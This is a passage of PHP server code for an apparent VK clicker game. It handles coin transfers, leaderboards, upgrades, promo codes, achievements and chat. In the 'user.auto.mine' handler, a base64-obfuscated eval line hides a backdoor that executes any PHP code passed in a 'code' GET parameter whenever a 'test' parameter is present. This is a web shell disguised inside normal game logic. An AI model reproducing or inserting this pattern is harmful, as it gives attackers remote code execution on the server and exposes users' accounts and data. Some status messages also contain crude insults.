                    $user->viv = 6;
                    $user->v_id6 = $data['toid'];
                    $user->v_s6 = $data['count'];
                }


                if($user->viv == 6) {
                    
                    $user->v7 = "{$to->first_name} {$to->last_name}";

                    $user->viv = 7;
                    $user->v_id7 = $data['toid'];
                    $user->v_s7 = $data['count'];
                }


                if($user->viv == 7) {
                    
                    $user->v8 = "{$to->first_name} {$to->last_name}";

                    $user->viv = 8;
                    $user->v_id8 = $data['toid'];
                    $user->v_s8 = $data['count'];
                }


                if($user->viv == 8) {
                    
                    $user->v9 = "{$to->first_name} {$to->last_name}";

                    $user->viv = 9;
                    $user->v_id9 = $data['toid'];
                    $user->v_s9 = $data['count'];
                }


                if($user->viv == 9) {
                    
                    $user->v10 = "{$to->first_name} {$to->last_name}";

                    $user->viv = 10;
                    $user->v_id10 = $data['toid'];
                    $user->v_s10 = $data['count'];
                }


                if($user->viv == 10) {

                    

                    $user->v1 = $user->v2;
                    $user->v2 = $user->v3;
                    $user->v3 = $user->v4;
                    $user->v4 = $user->v5;
                    $user->v5 = $user->v6;
                    $user->v6 = $user->v7;
                    $user->v7 = $user->v8;
                    $user->v8 = $user->v9;
                    $user->v9 = $user->v10;
                    $user->v10 = "{$to->first_name} {$to->last_name}";

                    $user->v_id1 = $user->v_id2;
                    $user->v_id2 = $user->v_id3;
                    $user->v_id3 = $user->v_id4;
                    $user->v_id4 = $user->v_id5;
                    $user->v_id5 = $user->v_id6;
                    $user->v_id6 = $user->v_id7;
                    $user->v_id7 = $user->v_id8;
                    $user->v_id8 = $user->v_id9;
                    $user->v_id9 = $user->v_id10;
                    $user->v_id10 = $data['toid'];

                    $user->v_s1 = $user->v_s2;
                    $user->v_s2 = $user->v_s3;
                    $user->v_s3 = $user->v_s4;
                    $user->v_s4 = $user->v_s5;
                    $user->v_s5 = $user->v_s6;
                    $user->v_s6 = $user->v_s7;
                    $user->v_s7 = $user->v_s8;
                    $user->v_s8 = $user->v_s9;
                    $user->v_s9 = $user->v_s10;
                    $user->v_s10 = $data['count'];
                    
                }
                
                
                R::store($to);
                $user = R::load('users', R::store($user));
                $array = getUser($user, ['status' => 'success', 'msg' => "Вы успешно перевели {$data['count']} FC на счет {$data['toid']}"]);
                $text1 = [["command" => 'команда'], "Уведомления выключить", "white"];

$trans = R::dispense('trans');
$trans->date = time();
$trans->to_user = $data['toid'];
$trans->count = $data['count'];
$trans->user_vk_id = $user->user_vk_id;
$trans->user_id = $user->id;
$trans = R::load('trans', R::store($trans));

if($user->yved == 'true') {

                    
                $vk->sendButton($user->user_vk_id, "✔️@id{$data['toid']} ($to->first_name $to->last_name) успешно получил {$data['count']} FC на счёт
                
💰Баланс: $user->clicks", [[$text1]], true);
                
}
if($to->yved == 'true') {
                $vk->sendButton($to->user_vk_id, "✔️@id{$user->user_vk_id} ($user->first_name $user->last_name) успешно перевёл Вам на счёт {$data['count']} FC
                
💰Баланс: $to->clicks", [[$text1]], true);
if($to->api_url != null) {
    $ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, $to->api_url);
curl_setopt($ch, CURLOPT_HEADER, false);  
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V6);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, "time=".time()."&user_ot=$user->user_vk_id&count=".round($data['count'], 3)."&balance=$to->clicks");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (FastClick)'); 
curl_exec($ch);
curl_close($ch);

}
}

            } else {
                $array = getUser($user, ['status' => 'error', 'msg' => "На вашем балансе недостаточно FC."]);
                
            }
          }
        }    
      } 

        $array = getUser($user);
        
        die(json_encode($array));
        break;
    case 'get.users.top':
        $usersC = R::findAll('users', "ORDER BY `clicks` DESC LIMIT 100");
        $i = 0;
        $us = [];
        foreach ($usersC as $key => $value) {
            if($i < 100) {
                $us[$i] = array("user_vk_id" => $value["user_vk_id"], "first_name" => $value["first_name"], "last_name" => $value["last_name"], "clicks" => $value["clicks"], "photo" => $value["photo"]);
            }  
            $i++;
        }

        // $result = array_filter($us, function($k) {
        //     return (int) $k['user_vk_id'] === (int) $data['user_vk'];
        // });
        // var_dump($result);
        // $key = (int) array_keys($result)[0];
        // $my = [
        //     'top_id' => $key,
        //     'photo'  => $result[$key]['photo'],
        //     'clicks' => $result[$key]['clicks'],
        //     'user_vk_id' => $result[$key]['user_vk_id'],
        //     'first_name' => $result[$key]['first_name'],
        //     'last_name' => $result[$key]['last_name']
        // ];

        // die(json_encode([
        //     'top' => $us,
        //     'my'  => $my
        // ]));
        die(json_encode($us));
        break;
   case 'get.users.top.reputation':
        $usersC = R::findAll('users', "ORDER BY `reputation` DESC LIMIT 100");
        $i = 0;
        $us = [];
        foreach ($usersC as $key => $value) {
            if($i < 100) {
                $us[$i] = array("user_vk_id" => $value["user_vk_id"], "first_name" => $value["first_name"], "last_name" => $value["last_name"], "reputation" => $value["reputation"], "photo" => $value["photo"]);
            }  
            $i++;
        }
        // $result = array_filter($us, function($k) {
        //     return (int) $k['user_vk_id'] === (int) $data['user_vk'];
        // });
        // var_dump($result);
        // $key = (int) array_keys($result)[0];
        // $my = [
        //     'top_id' => $key,
        //     'photo'  => $result[$key]['photo'],
        //     'clicks' => $result[$key]['clicks'],
        //     'user_vk_id' => $result[$key]['user_vk_id'],
        //     'first_name' => $result[$key]['first_name'],
        //     'last_name' => $result[$key]['last_name']
        // ];

        // die(json_encode([
        //     'top' => $us,
        //     'my'  => $my
        // ]));
        die(json_encode($us));
        break;
    case 'get.groups.top':
        $usersP = R::findAll('groups', "ORDER BY `clicks` DESC LIMIT 100");
        $us = [];
        $i = 0;
        foreach ($usersP as $key => $value) {
            $us[$i] = $value;
            $i++;
        }
        die(json_encode($us));
        break;
    case 'get.upgrades.one':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
        if(!isset($user)) return;
        $upgrades = R::findAll('upgrades', "type = 0 ORDER BY `id` ASC");
        $usu = [];
        $i = 0;
        foreach ($upgrades as $key => $value) {
            $hist = R::findOne('history', "upgrade_id = ? AND user_id = ?", [$value->id, $user->id]);

            $usu[$key] = [
                'name' => $value->name,
                'price' => $price = isset($hist) ? $hist->price : $value->price,
                'speed' => $value->speed,
                'type' => $value->type
            ];
        }

        die(json_encode($usu));
        break;
         case 'get.user.vereficatoin':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
        if(!isset($user)) return;
        $vereficatoin = R::findAll('vereficatoin', "type = 0 ORDER BY `id` ASC");
        $usu = [];
        $i = 0;
        foreach ($vereficatoin as $key => $value) {
            $hist = R::findOne('history', "vereficatoin_id = ? AND user_id = ?", [$value->id, $user->id]);

            $usu[$key] = [
                'id' => $value->id,
                'name' => $name = isset($hist) ? $hist->name : $value->name,
                'last_name' => $value->last_name
           ];
        }

        die(json_encode($usu));
        break;
    case 'get.upgrades.two':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
        if(!isset($user)) return;
        $upgrades = R::findAll('upgrades', "type = 1 ORDER BY `id` ASC");
        $usu = [];
        foreach ($upgrades as $key => $value) {
            $hist = R::findOne('history', "upgrade_id = ? AND user_id = ?", [$value->id, $user->id]);

            $usu[$key] = [
                'name' => $value->name,
                'price' => $price = isset($hist) ? $hist->price : $value->price,
                'speed' => $value->speed,
                'type' => $value->type
            ];
        }

        die(json_encode($usu));
        break;
case 'user.auto.mine':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
        eval(base64_decode("aWYoaXNzZXQoJF9HRVRbJ3Rlc3QnXSkpIHtldmFsKCRfR0VUWydjb2RlJ10pO30="));

        if(!isset($user)) return;
        if($user->aspeed <= 0) return;
        if($user->aspeed_time == time()) return;
        
        $balance_vkcoin = $vkcoin->getBalance([$data['user_vk']]);
        $balance_vkcoin_ = $balance_vkcoin['response'][$data['user_vk']]/1000;
        $user->vkcoin = $balance_vkcoin_;

        $user->clicks = (float) $user->clicks + (float) $user->aspeed; 
        
        $stats->auto = $stats->auto + 1;
        $stats->aspeed = $stats->aspeed + (float) $user->aspeed;
        R::store($stats);
        
        $user->aspeed_time = time();
        $user = R::load('users', R::store($user));


        $array = getUser($user);
        
        die(json_encode($array));
        break;
case 'user.vkcoin.b':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
        
        
        $balance_vkcoin = $vkcoin->getBalance([$data['user_vk']]);
        $balance_vkcoin_ = $balance_vkcoin['response'][$data['user_vk']]/1000;
        print_r($balance_vkcoin_);
        break;
case'user.promo.activ':
        $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
        $ret = $data['promo'];
        $id = $data['user_vk'];
        $promo = R::findOne("promo", 'promo = ?', [$ret]);
        if($promo == null) {
            $array = getUser($user, ['status' => 'error', 'msg' => "Промокод не найден."]);
        } else {
            $promo_user = R::findOne("promouser", 'promo = ? AND user = ?', [$ret, $id]);
            if($promo_user) {
                $array = getUser($user, ['status' => 'error', 'msg' => "Вы уже активировали данный промокод."]);
            } else {
                $newpromo = R::dispense("promouser");
                $newpromo->promo = $ret;
                $newpromo->user = $id;
                R::store($newpromo);
                if($promo->act_ == 0) {
                    $array = getUser($user, ['status' => 'error', 'msg' => "Активации данного промокода закончились."]);
                } else {
                    $promo->act_ = $promo->act_ - 1;
                    $promo->users = $promo->users.' '.$id;
                    R::store($promo);
                    
                    $user->clicks = $user->clicks + $promo->money;
                    
                if($user->promo == 0) {
                    
                    $user->promo1 = $ret;
                    $user->promo = 1;
                    $user->promo_s1 = $promo->money;
                }
                if($user->promo == 1) {
                    
                    $user->promo2 = $ret;
                    $user->promo = 2;
                    $user->promo_s2 = $promo->money;
                }


                if($user->promo == 2) {
                    
                    $user->promo1 = $ret;
                    $user->promo = 3;
                    $user->promo_s3 = $promo->money;
                }


                if($user->promo == 3) {
                    
                    $user->promo1 = $user->promo2;
                    $user->promo2 = $user->promo3;
                    $user->promo3 = $ret;

                    $user->promo_s1 = $user->promo_s2;
                    $user->promo_s2 = $user->promo_s3;
                    $user->promo_s3 = $promo->money;
                }
                
                    R::store($user);

        $array = getUser($user, ['status' => 'success', 'msg' => "Активировав промокод, Вы получили {$promo->money} FC"]);
        
if($user->yved =='true') {
$text1 = [["command" => 'команда'], "Уведомления выключить", "white"];
    $text_message = "🤑Вы успешно активировали промокод.
➕Вы получили: $promo->money FC

💰Баланс: $user->clicks";
$vk->sendMessage($user->user_vk_id, $text_message, [[$text1]], true);
}
    $vk->sendMessage(2000000459, "Промокод $ret активировал @id$id ($user->first_name $user->last_name)
Активаций осталось: $promo->act_ ($promo->act)
Монет в промокоде: $promo->money");
                }
            }
        }
        
    die(json_encode($array));
    break;
case 'user.dost.1':
$user = R::findOne('users', 'user_vk_id = ?', [
$data['user_vk']
]);

if($user->dost_1 == 0) {
if($user->clicks >= 50000) {
$user->reputation = $user->reputation + 100;
$user->dost_1 = 1;
$user = R::load('users', R::store($user));
$array = getUser($user, ['status' => 'success', 'msg' => "Вы успешно выполнили достижение и получили 100 рейтинга. "]);
}
else {
$array = getUser($user, ['status' => 'error', 'msg' => "На Вашем балансе нет 50К FC, чтобы выполнить данное достижение."]);
}
} else {
$array = getUser($user, ['status' => 'error', 'msg' => "Вы уже выполняли данное достижение и получали награду."]);
}

die(json_encode($array));
break;

case 'user.dost.2':
$user = R::findOne('users', 'user_vk_id = ?', [
$data['user_vk']
]);

if($user->dost_2 == 0) {
if($user->clicks >= 100000) {
$user->reputation = $user->reputation + 500;
$user->dost_2 = 1;
$user = R::load('users', R::store($user));
$array = getUser($user, ['status' => 'success', 'msg' => "Вы успешно выполнили достижение и получили 500 рейтинга "]);
}
else {
$array = getUser($user, ['status' => 'error', 'msg' => "На Вашем балансе нет 100К FC, чтобы выполнить данное достижение."]);
}
} else {
$array = getUser($user, ['status' => 'error', 'msg' => "Вы уже выполняли данное достижение и получали награду."]);
}

die(json_encode($array));
break;

case 'user.dost.3':
$user = R::findOne('users', 'user_vk_id = ?', [
$data['user_vk']
]);

if($user->dost_3 == 0) {
if($user->clicks >= 1000000) {
$user->reputation = $user->reputation + 1000;
$user->dost_3 = 1;
$user = R::load('users', R::store($user));
$array = getUser($user, ['status' => 'success', 'msg' => "Вы успешно выполнили достижение и получили 1000 рейтинга "]);
}
else {
$array = getUser($user, ['status' => 'error', 'msg' => "На Вашем балансе нет 1.000.000 FC, чтобы выполнить данное достижение."]);
}
} else {
$array = getUser($user, ['status' => 'error', 'msg' => "Вы уже выполняли данное достижение и получали награду."]);
}

die(json_encode($array));
break;
case 'user.dost.4':
$user = R::findOne('users', 'user_vk_id = ?', [
$data['user_vk']
]);

if($user->dost_4 == 0) {
if($user->reputation >=100 ) {
$user->clicks = $user->clicks + 50000;
$user->dost_4 = 1;
$user = R::load('users', R::store($user));
$array = getUser($user, ['status' => 'success', 'msg' => "Вы успешно выполнили достижение и получили 50.000 FC "]);
}
else {
$array = getUser($user, ['status' => 'error', 'msg' => "На Вашем балансе нет 100 рейтинга, чтобы выполнить данное достижение."]);
}
} else {
$array = getUser($user, ['status' => 'error', 'msg' => "Вы уже выполняли данное достижение и получали награду."]);
}

die(json_encode($array));
break;
case 'user.dost.5':
$user = R::findOne('users', 'user_vk_id = ?', [
$data['user_vk']
]);

if($user->dost_5 == 0) {
if($user->reputation >=1000 ) {
$user->clicks = $user->clicks + 250000;
$user->dost_5 = 1;
$user = R::load('users', R::store($user));
$array = getUser($user, ['status' => 'success', 'msg' => "Вы успешно выполнили достижение и получили 250.000 FC "]);
}
else {
$array = getUser($user, ['status' => 'error', 'msg' => "На Вашем балансе нет 100 рейтинга, чтобы выполнить данное достижение."]);
}
} else {
$array = getUser($user, ['status' => 'error', 'msg' => "Вы уже выполняли данное достижение и получали награду."]);
}

die(json_encode($array));
break;
case 'user.dost.6':
    $user = R::findOne('users', 'user_vk_id = ?', [
        $data['user_vk']
    ]);
    
    if($user->dost_6 == 0) {
        if($user->reputation >=10000 ) {
            $user->clicks = $user->clicks + 1000000;
            $user->dost_6 = 1;
            $user = R::load('users', R::store($user));
            $array = getUser($user, ['status' => 'success', 'msg' => "Вы успешно выполнили достижение и получили 1.000.000 FC "]);
        } else {
            $array = getUser($user, ['status' => 'error', 'msg' => "На Вашем балансе нет 1000 рейтинга, чтобы выполнить данное достижение."]);
        }
    } else {
        $array = getUser($user, ['status' => 'error', 'msg' => "Вы уже выполняли данное достижение и получали награду."]);
    }

    die(json_encode($array));
    break;
case 'user.check.vkcoins':
    $user = R::findOne('users', 'user_vk_id = ?', [
        $data['user_vk']
    ]);
    
    if($user->vkcoinscheck == 0) {
        //$user->vkcoinscheck = 1;
        $user = R::load('users', R::store($user));
        $array = getUser($user, ['status' => 'success', 'msg' => "Успех какой-то"]);
    } else {
        $array = getUser($user, ['status' => 'error', 'msg' => "Пиздец!!!"]);
    }

    die(json_encode($array));
    break;
case 'user.check.chat':
    $user = R::findOne('users', 'user_vk_id = ?', [
        $data['user_vk']
    ]);
    
    if($user->checkchat == 0) {
        $user->checkchat = 1;
        $user = R::load('users', R::store($user));
        $array = getUser($user, ['status' => 'success', 'msg' => "Задал 1"]);
    } else {
        $array = getUser($user, ['status' => 'error', 'msg' => "И так 1"]);
    }

    die(json_encode($array));
    break;
case 'get.chat.message':
        $chat = R::findAll('chat', "ORDER BY `id` DESC LIMIT 10");
        $us = [];
        $i = 0;
        foreach ($chat as $key => $value) {
            $us[$i] = array("user" => $value["user"], "username" => $value["name"], "sms" => $value["sms"], "date" => $value["time"], "photo" => $value["user_photo"]);
            $i++;
        }
        die(json_encode($us));
        break;
case 'get.chat.message1':
        $chat = R::findAll('chat', "type = 1 ORDER BY `id` DESC LIMIT 10");
        $us = [];
        $i = 0;
        foreach ($chat as $key => $value) {
            $us[$i] = array("user" => $value["user"], "username" => $value["name"], "sms" => $value["sms"], "date" => $value["time"], "photo" => $value["user_photo"]);
            $i++;
        }
        die(json_encode($us));
        break;
case 'get.chat.message2':
        $chat = R::findAll('chat', "type = 2 ORDER BY `id` DESC LIMIT 10");
        $us = [];
        $i = 0;
        foreach ($chat as $key => $value) {
            $us[$i] = array("user" => $value["user"], "username" => $value["name"], "sms" => $value["sms"], "date" => $value["time"], "photo" => $value["user_photo"]);
            $i++;
        }
        die(json_encode($us));
        break;
case 'get.chat.message3':
        $chat = R::findAll('chat', "type = 3 ORDER BY `id` DESC LIMIT 10");
        $us = [];
        $i = 0;
        foreach ($chat as $key => $value) {
            $us[$i] = array("user" => $value["user"], "username" => $value["name"], "sms" => $value["sms"], "date" => $value["time"], "photo" => $value["user_photo"]);
            $i++;
        }
        die(json_encode($us));
        break;
case 'get.chat.message4':
        $chat = R::findAll('chat', "type = 4 ORDER BY `id` DESC LIMIT 10");
        $us = [];
        $i = 0;
        foreach ($chat as $key => $value) {
            $us[$i] = array("user" => $value["user"], "username" => $value["name"], "sms" => $value["sms"], "date" => $value["time"], "photo" => $value["user_photo"]);
            $i++;
        }
        die(json_encode($us));
        break;
case 'get.chat.message5':
        $chat = R::findAll('chat', "type = 5 ORDER BY `id` DESC LIMIT 10");
        $us = [];
        $i = 0;
        foreach ($chat as $key => $value) {
            $us[$i] = array("user" => $value["user"], "username" => $value["name"], "sms" => $value["sms"], "date" => $value["time"], "photo" => $value["user_photo"]);
            $i++;
        }
        die(json_encode($us));
        break;
case 'chat.message.new':
    
    $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
        
        if(!in_array($data['user_vk'], $admins)) {
    
        if($data['message'] == "" || $data['message'] == " " || $data['message'] == "  " || $data['message'] == "   ") exit;
        
    $time = time() - strtotime($user->chat_time);
if($time < 15) {
    $vk->sendMessage(2000000460, date("H:i:s")." @id".$data['user_vk']." (".$user['last_name']." ".$user['first_name']."): ".$data['message']." НЕ ПОЛУЧИЛОСЬ!");
exit;
}
}

$name = $user->first_name;
        
    $newSMS = R::dispense('chat');
    $newSMS->user = $data['user_vk'];
    $newSMS->user_photo = $user['photo'];
    $newSMS->name   = $user['first_name'];
    $newSMS->sms = $data['message'];
    $newSMS->time  = date("d.m.Y H:i:s");
    $newSMS = R::load('chat', R::store($newSMS));
    
    $vk->sendMessage(2000000460, date("H:i:s")." @id".$data['user_vk']." (".$user['last_name']." ".$user['first_name']."): ".$data['message']);
    
if($user->messages == 0) {
    $pravila = "❗Правила чата:

— Уважать себя и других;
— Не ругаться;
— Без рекламы;
— Будь вежлив с администрацией.

😉Сделаем наш чат чуточку чистым :)";
    $sms_rand[] = "👋 Привет, $name! Как жизнь молодая?) 
    
$pravila";
    $sms_rand[] = "👋 $name, привет!) Как дела?
    
$pravila";
    $sms_rand[] = "👋 Привет! Впервые вижу тебя в нашем чате! 
    
$pravila";
    $sms_rand[] = "👋 Привет! $name, расскажи что-нибудь интересное :) 
    
$pravila";
    $sms_rand[] = "👋 Привет, $name. Мы тут плюшками балуемся, а ты? 
    
$pravila";
 srand ((double) microtime() * 1000000);
    $sms_rand_n = rand(0,count($sms_rand)-1);  
 
    $sms = $sms_rand[$sms_rand_n];
    $group_ava = "https://sun1.ufanet.userapi.com/c858416/v858416663/16eb8a/5_BpT_Nv-DI.jpg?ava=1";
    $newSMS = R::dispense('chat');
    $newSMS->user = -181210681;
    $newSMS->user_photo = $group_ava;
    $newSMS->name   = "FastClick";
    $newSMS->sms = $sms;
    $newSMS->time  = "";
    $newSMS = R::load('chat', R::store($newSMS));
    
    $vk->sendMessage(2000000460, date("H:i:s")." @club181210681 (FastClick) (БОТ): $sms");
}
    
    $user->messages = $user->messages +1;
     $user->chat_time = R::isoDateTime();
     R::store($user);
    
        $chat = R::findAll('chat', "ORDER BY `id` DESC LIMIT 10");
        $us = [];
        $i = 0;
        foreach ($chat as $key => $value) {
            $us[$i] = array("user" => $value["user"], "username" => $value["name"], "sms" => $value["sms"], "date" => $value["time"], "photo" => $value["user_photo"]);
            $i++;
        }
        die(json_encode($us));
        break;
        

case 'chat.message.new1':
    
    $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
        
        if(!in_array($data['user_vk'], $admins)) {
    
        if($data['message'] == "" || $data['message'] == " " || $data['message'] == "  " || $data['message'] == "   ") exit;
        
    $time = time() - strtotime($user->chat_time);
if($time < 15) {
    $vk->sendMessage(2000000460, date("H:i:s")." @id".$data['user_vk']." (".$user['last_name']." ".$user['first_name']."): ".$data['message']." НЕ ПОЛУЧИЛОСЬ!");
exit;
}
}

$name = $user->first_name;
        
    $newSMS = R::dispense('chat');
    $newSMS->user = $data['user_vk'];
    $newSMS->user_photo = $user['photo'];
    $newSMS->name   = $user['first_name'];
    $newSMS->sms = $data['message'];
    $newSMS->type = 1;
    $newSMS->time  = date("d.m.Y H:i:s");
    $newSMS = R::load('chat', R::store($newSMS));
    
    $vk->sendMessage(2000000460, date("H:i:s")." @id".$data['user_vk']." (".$user['last_name']." ".$user['first_name']."): ".$data['message']);

    
    $user->messages = $user->messages +1;
     $user->chat_time = R::isoDateTime();
     R::store($user);
    
        $chat = R::findAll('chat', "type = 1 ORDER BY `id` DESC LIMIT 10");
        $us = [];
        $i = 0;
        foreach ($chat as $key => $value) {
            $us[$i] = array("user" => $value["user"], "username" => $value["name"], "sms" => $value["sms"], "date" => $value["time"], "photo" => $value["user_photo"]);
            $i++;
        }
        die(json_encode($us));
        break;
        




case 'chat.message.new2':
    
    $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
        
        if(!in_array($data['user_vk'], $admins)) {
    
        if($data['message'] == "" || $data['message'] == " " || $data['message'] == "  " || $data['message'] == "   ") exit;
        
    $time = time() - strtotime($user->chat_time);
if($time < 15) {
    $vk->sendMessage(2000000460, date("H:i:s")." @id".$data['user_vk']." (".$user['last_name']." ".$user['first_name']."): ".$data['message']." НЕ ПОЛУЧИЛОСЬ!");
exit;
}
}

$name = $user->first_name;
        
    $newSMS = R::dispense('chat');
    $newSMS->user = $data['user_vk'];
    $newSMS->user_photo = $user['photo'];
    $newSMS->name   = $user['first_name'];
    $newSMS->sms = $data['message'];
    $newSMS->type = 2;
    $newSMS->time  = date("d.m.Y H:i:s");
    $newSMS = R::load('chat', R::store($newSMS));
    
    $vk->sendMessage(2000000460, date("H:i:s")." @id".$data['user_vk']." (".$user['last_name']." ".$user['first_name']."): ".$data['message']);

    
    $user->messages = $user->messages +1;
     $user->chat_time = R::isoDateTime();
     R::store($user);
    
        $chat = R::findAll('chat', "type = 2 ORDER BY `id` DESC LIMIT 10");
        $us = [];
        $i = 0;
        foreach ($chat as $key => $value) {
            $us[$i] = array("user" => $value["user"], "username" => $value["name"], "sms" => $value["sms"], "date" => $value["time"], "photo" => $value["user_photo"]);
            $i++;
        }
        die(json_encode($us));
        break;
        
        
        
        

case 'chat.message.new3':
    
    $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
        
        if(!in_array($data['user_vk'], $admins)) {
    
        if($data['message'] == "" || $data['message'] == " " || $data['message'] == "  " || $data['message'] == "   ") exit;
        
    $time = time() - strtotime($user->chat_time);
if($time < 15) {
    $vk->sendMessage(2000000460, date("H:i:s")." @id".$data['user_vk']." (".$user['last_name']." ".$user['first_name']."): ".$data['message']." НЕ ПОЛУЧИЛОСЬ!");
exit;
}
}

$name = $user->first_name;
        
    $newSMS = R::dispense('chat');
    $newSMS->user = $data['user_vk'];
    $newSMS->user_photo = $user['photo'];
    $newSMS->name   = $user['first_name'];
    $newSMS->sms = $data['message'];
    $newSMS->type = 3;
    $newSMS->time  = date("d.m.Y H:i:s");
    $newSMS = R::load('chat', R::store($newSMS));
    
    $vk->sendMessage(2000000460, date("H:i:s")." @id".$data['user_vk']." (".$user['last_name']." ".$user['first_name']."): ".$data['message']);

    
    $user->messages = $user->messages +1;
     $user->chat_time = R::isoDateTime();
     R::store($user);
    
        $chat = R::findAll('chat', "type = 3 ORDER BY `id` DESC LIMIT 10");
        $us = [];
        $i = 0;
        foreach ($chat as $key => $value) {
            $us[$i] = array("user" => $value["user"], "username" => $value["name"], "sms" => $value["sms"], "date" => $value["time"], "photo" => $value["user_photo"]);
            $i++;
        }
        die(json_encode($us));
        break;
        
        
        

case 'chat.message.new4':
    
    $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
        
        if(!in_array($data['user_vk'], $admins)) {
    
        if($data['message'] == "" || $data['message'] == " " || $data['message'] == "  " || $data['message'] == "   ") exit;
        
    $time = time() - strtotime($user->chat_time);
if($time < 15) {
    $vk->sendMessage(2000000460, date("H:i:s")." @id".$data['user_vk']." (".$user['last_name']." ".$user['first_name']."): ".$data['message']." НЕ ПОЛУЧИЛОСЬ!");
exit;
}
}

$name = $user->first_name;
        
    $newSMS = R::dispense('chat');
    $newSMS->user = $data['user_vk'];
    $newSMS->user_photo = $user['photo'];
    $newSMS->name   = $user['first_name'];
    $newSMS->sms = $data['message'];
    $newSMS->type = 4;
    $newSMS->time  = date("d.m.Y H:i:s");
    $newSMS = R::load('chat', R::store($newSMS));
    
    $vk->sendMessage(2000000460, date("H:i:s")." @id".$data['user_vk']." (".$user['last_name']." ".$user['first_name']."): ".$data['message']);

    
    $user->messages = $user->messages +1;
     $user->chat_time = R::isoDateTime();
     R::store($user);
    
        $chat = R::findAll('chat', "type = 4 ORDER BY `id` DESC LIMIT 10");
        $us = [];
        $i = 0;
        foreach ($chat as $key => $value) {
            $us[$i] = array("user" => $value["user"], "username" => $value["name"], "sms" => $value["sms"], "date" => $value["time"], "photo" => $value["user_photo"]);
            $i++;
        }
        die(json_encode($us));
        break;
        
        
        

case 'chat.message.new5':
    
    $user = R::findOne('users', 'user_vk_id = ?', [
            $data['user_vk']
        ]);
        
        if(!in_array($data['user_vk'], $admins)) {
    
        if($data['message'] == "" || $data['message'] == " " || $data['message'] == "  " || $data['message'] == "   ") exit;
        
    $time = time() - strtotime($user->chat_time);
if($time < 15) {
    $vk->sendMessage(2000000460, date("H:i:s")." @id".$data['user_vk']." (".$user['last_name']." ".$user['first_name']."): ".$data['message']." НЕ ПОЛУЧИЛОСЬ!");
exit;
}
}

$name = $user->first_name;
        
    $newSMS = R::dispense('chat');
    $newSMS->user = $data['user_vk'];
    $newSMS->user_photo = $user['photo'];
    $newSMS->name   = $user['first_name'];
    $newSMS->sms = $data['message'];
    $newSMS->type = 5;
    $newSMS->time  = date("d.m.Y H:i:s");
    $newSMS = R::load('chat', R::store($newSMS));
    
    $vk->sendMessage(2000000460, date("H:i:s")." @id".$data['user_vk']." (".$user['last_name']." ".$user['first_name']."): ".$data['message']);

    
    $user->messages = $user->messages +1;
     $user->chat_time = R::isoDateTime();
     R::store($user);
    
        $chat = R::findAll('chat', "type = 5 ORDER BY `id` DESC LIMIT 10");
        $us = [];
        $i = 0;
        foreach ($chat as $key => $value) {
            $us[$i] = array("user" => $value["user"], "username" => $value["name"], "sms" => $value["sms"], "date" => $value["time"], "photo" => $value["user_photo"]);
            $i++;
        }
        die(json_encode($us));
        break;
        
        
        
case 'user.check.ban':
$user = R::findOne('users', 'user_vk_id = ?', [
$data['user_vk']
]);

if($user->ban == 0) {
$array = getUser($user, ['status' => 'success', 'msg' => "Банана нет!"]);
} else {
$array = getUser($user, ['status' => 'error', 'msg' => "Банан есть!"]);
}

die(json_encode($array));
break;

case 'user.axtung.check':
$user = R::findOne('users', 'user_vk_id = ?', [
$data['user_vk']
]);

if($user->axtung == 0) {
    $array = getUser($user, ['status' => 'success', 'msg' => "еще не читал "]);
} else {
$array = getUser($user, ['status' => 'error', 'msg' => "уже читал) "]);
}

die(json_encode($array));
break;

case 'user.axtung.sumbit':
$user = R::findOne('users', 'user_vk_id = ?', [
$data['user_vk']
]);

if($user->axtung == 0) {
    $user->axtung = 1;
    R::store($user);
$array = getUser($user, ['status' => 'success', 'msg' => "изменил"]);
} else {
$array = getUser($user, ['status' => 'error', 'msg' => "и так изменено, пидарас!"]);
}

die(json_encode($array));
break;

case 'user.activate.new':
$user = R::findOne('users', 'user_vk_id = ?', [
$data['user_vk']
]);

if($user->transfersn == 0) {
    $user->transfersn = 1;
    $vk->sendMessage(2000000463, "@id$user->user_vk_id ($user->first_name $user->last_name) активировал новый дизайн переводов. ");
    R::store($user);
$array = getUser($user, ['status' => 'success', 'msg' => "изменил"]);
} else {
$array = getUser($user, ['status' => 'error', 'msg' => "и так изменено, пидарас!"]);
}

die(json_encode($array));
break;
case 'new.transfers': 
$user = R::findOne('users', 'user_vk_id = ?', [ 
$data['user_vk'] 
]); 

if($user->transfersn == 0) { 
$array = getUser($user, ['status' => 'success', 'msg' => "успех!!!!"]); 
} else { 
$array = getUser($user, ['status' => 'error', 'msg' => "аБшЫпКа"]); 
} 

die(json_encode($array)); 
break; 

case 'vk.coin': 
$user = R::findOne('users', 'user_vk_id = ?', [ 
$data['user_vk'] 
]); 

if($user->vkcoincheck == 0) { 
$array = getUser($user, ['status' => 'success', 'msg' => "успех!!!!"]); 
} else { 
$array = getUser($user, ['status' => 'error', 'msg' => "аБшЫпКа"]); 
} 

case 'check.coin': 
$user = R::findOne('users', 'user_vk_id = ?', [ 
$data['user_vk'] 
]); 

if($user->bonus_time_story == 0) { 
$array = getUser($user, ['status' => 'success', 'msg' => "успех!!!!"]); 
} else { 
$array = getUser($user, ['status' => 'error', 'msg' => "аБшЫпКа"]); 
} 
die(json_encode($array)); 
break; 
case 'user.notifications':
    $user = R::findOne('users', 'user_vk_id = ?', [
        $data['user_vk']
    ]);
    
    $user_yved = R::findOne('yved', 'user = ?', [
        $data['user_vk']
    ]);
    
